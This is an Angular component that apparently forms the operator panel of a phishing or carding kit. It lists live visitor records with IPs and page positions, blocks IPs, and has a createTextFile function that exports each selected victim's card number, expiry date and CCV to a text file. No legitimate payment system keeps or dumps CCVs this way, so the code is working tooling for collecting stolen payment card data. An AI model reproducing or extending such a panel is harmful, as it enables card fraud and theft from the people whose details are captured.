import { AfterViewInit, Component, ElementRef, OnDestroy, OnInit, ViewChild } from '@angular/core';
import { faToggleOn ,faToggleOff,faEdit , faArrowRight  } from '@fortawesome/free-solid-svg-icons';
import * as $ from 'jquery';

import 'datatables.net';
import { AppService } from '../app.service';
interface Item {
  name: string;
  checked: boolean;
  // Add other properties as needed
}


@Component({
  selector: 'app-home',
  templateUrl: './home.component.html',
  styleUrls: ['./home.component.css']
})


export class HomeComponent implements AfterViewInit, OnDestroy {
  isDropdownOpen: boolean = false;
  isDropdownOpenExport: boolean = false;


  faArrowRight=faArrowRight;
  faEdit = faEdit;
  faOn = faToggleOn;
  faOff = faToggleOff;
  @ViewChild('token_table') tokenTable!: ElementRef;
  dataTable: any;
  showModal: boolean = false;
  checkedAll: boolean = false;
e:any;
blk:any;
editedComment: string = '';
users:any;
ipBlocked:boolean = false;
limitSelect:any="10";
current_page:any=1;
total_pages:any;
total_users:any;

constructor(private appService:AppService){}
  ngAfterViewInit() {
  }

  ngOnInit(){
    this.e=this.exampleData[0];
    this.blk=this.exampleData[0];
    this.getUsers();
    setInterval(() => {
      this.getUsers();
    }, 7000);
  }

 

  ngOnDestroy() {
    if (this.dataTable) {
      this.dataTable.destroy(true);
    }
  }

  

//////////

  onTitleClicked(title: string) {
    console.log(`You clicked on: ${title}`)
    // You can perform any action you want when a title is clicked
  }


  exampleData = [
    { DT_RowId: 1, re: 1 },
    { DT_RowId: 2, re: 0 },
    // Add more data objects as needed
  ];


  toggleRe(id: number, reValue: number): void {
    // Find the index of the clicked object in the exampleData array
    const index = this.exampleData.findIndex(data => data.DT_RowId === id);

    if (index > -1) {
        // Toggle the 're' value
        this.exampleData[index].re = (reValue === 1) ? 0 : 1;
    }

    // You can log or perform any other operations here
   // console.log(`Toggling re value for ID: ${id}, updated value: ${this.exampleData[index].re}`);
    // Implement your logic here to change the 're' value in the data source
}

editComm(DT_RowId: number): void {
  // Logic for handling the edit_comm function when the icon is clicked
  console.log(`Edit clicked for DT_RowId: ${DT_RowId}`);
  // You can implement your edit_comm logic here
}

openModal() {
  this.showModal = true;
}

closeModal() {
  this.showModal = false;
}

saveChanges() {
  // Handle save changes logic here
  // You might want to implement your logic to save changes made in the modal
  this.closeModal();
}


//checkboxes

updateChecked(event: Event) {
  const target = event.target as HTMLInputElement;
  this.checkedAll = target.checked;
  this.users.forEach(item => {
    item.checked = target.checked; // Set checked to true for each user
  });

}

items = [
  { name: 'Item 1', checked: false },
  { name: 'Item 2', checked: false },
  // Add more items as needed
];

showSelectedRecords() {
  const selectedIds = this.users.filter(item => item.checked).map(item => item._id);// Filter selected items
  console.log(selectedIds);
  this.appService.deleteUser(selectedIds)
  .subscribe(response => {
    console.log(response)
   if(response.success){
    this.getUsers();
   }
  }
  );
  // You can perform any action here with the selected items
}

toggleChecked(index: number) {
  if(this.users[index].checked){
    this.users[index].checked = !this.users[index].checked;
  }else{
    this.users[index].checked = true;
  }
  
}

selectLimit(){
  console.log(this.limitSelect)
  this.getUsers();
}

//listUsers

getUsers(){


  this.appService.getUsers(this.limitSelect,this.current_page)
  .subscribe(response => {

    if(this.users){
      response.users.forEach((user) => {
        const foundUser = this.users.find((resUser) => resUser._id === user._id);
        if (foundUser) {
          user.checked = foundUser.checked;
        }
      });
    }

   

   this.users=response.users;

   this.total_pages=response.total_pages;
   this.current_page=response.current_page;
   this.total_users=response.total_users;
  }
  );
}

timeDifference(lastConnected: string): string {
  const currentTime = new Date();
  const connectedTime = new Date(lastConnected);

  const difference = Math.abs(currentTime.getTime() - connectedTime.getTime());

  const minutes = Math.floor(difference / 1000 / 60);
  const hours = Math.floor(minutes / 60);

  if (hours > 0) {
    return `${hours} hour${hours > 1 ? 's' : ''} ago`;
  } else if (minutes > 0) {
    return `${minutes} minute${minutes > 1 ? 's' : ''} ago`;
  } else {
    return 'Just now';
  }
}



toggleDropdown() {
  this.isDropdownOpen = !this.isDropdownOpen;
}
toggleDropdownExport() {
  this.isDropdownOpenExport = !this.isDropdownOpenExport;
}

del_() {
  // your delete selected function logic
  this.showSelectedRecords();
}

remove_empty() {
  // your remove empty function logic
}

remove_all() {
  // your remove all function logic
}

deleteOne(id){
  const ids=[id];
  this.appService.deleteUser(ids)
  .subscribe(response => {
    console.log(response)
   if(response.success){
    this.getUsers();
   }
  }
  );
}


getBrowserName(userAgentString) {
  const regexPatterns = {
      Chrome: /(?:Chrome|Chromium)\/([0-9.]+)/,
      Firefox: /Firefox\/([0-9.]+)/,
      Safari: /Version\/([0-9.]+)\sSafari/,
      Edge: /Edg\/([0-9.]+)/,
      InternetExplorer: /(?:MSIE |Trident\/.*; rv:)([0-9.]+)/,
      Opera: /OPR\/([0-9.]+)/,
  };

  for (const browser in regexPatterns) {
      const match = userAgentString.match(regexPatterns[browser]);
      if (match) {
          return browser;
      }
  }

  return "Unknown";
}

createTextFile(): void {
  const selectedUsers = this.users.filter(user => user.checked);

  let content = '';
  selectedUsers.forEach(user => {
    content += `| ${user.ip} | ${user.page_id} |\n`;
    if(user.quick_data.payment_info.length>0){
      content += `card=${user.quick_data.payment_info[user.quick_data.payment_info.length - 1]?.Card_number}\n`;
      content += `exp=${user.quick_data.payment_info[user.quick_data.payment_info.length - 1]?.Expiration_date}\n`;
      content += `ccv=${user.quick_data.payment_info[user.quick_data.payment_info.length - 1]?.CCV}`;
    }
    content +=`\n\n\n`
  });

  // Download the content as a .txt file
  this.downloadFile(content);
}

downloadFile(content: string): void {
  const blob = new Blob([content], { type: 'text/plain' });
  const url = window.URL.createObjectURL(blob);

  const link = document.createElement('a');
  link.setAttribute('href', url);
  link.setAttribute('download', 'report.txt');
  link.style.display = 'none';
  document.body.appendChild(link);
  link.click();

  // Clean up
  document.body.removeChild(link);
  window.URL.revokeObjectURL(url);
}


checkBlocked(blocked,userId,ip){
  if(blocked==false){
    this.appService.addBlocked(ip,userId)
    .subscribe(response => {
  
   this.getUsers();
    }
    );
  }else{
    this.appService.deleteBlocked(ip,userId)
    .subscribe(response => {
  
   this.getUsers();
    }
    );
  }



}


navigateTo(index){
  this.current_page=index
  this.appService.getUsers(this.limitSelect,this.current_page)
  .subscribe(response => {
   this.users=response.users;
   this.total_pages=response.total_pages;
   this.current_page=response.current_page;
   this.total_users=response.total_users;
  }
  );

}

nextPage(){
  let next =''+this.current_page;
  this.current_page=parseInt(next)+1
  this.navigateTo(this.current_page)

}
previousPage(){
  let previous =''+this.current_page;
  this.current_page=parseInt(previous)-1
  this.navigateTo(this.current_page)
}

getButtonRange(): number[] {
  const numButtons = 5;
  let start = Math.max(1, this.current_page - 2);
  const end = Math.min(this.total_pages, start + numButtons - 1);
  const buttons = [];
 

  if(end-start<4 && this.total_pages>5)
  start=end-4

  for (let i = start; i <= end; i++) {
    buttons.push(i);
  }

  return buttons;
}


}
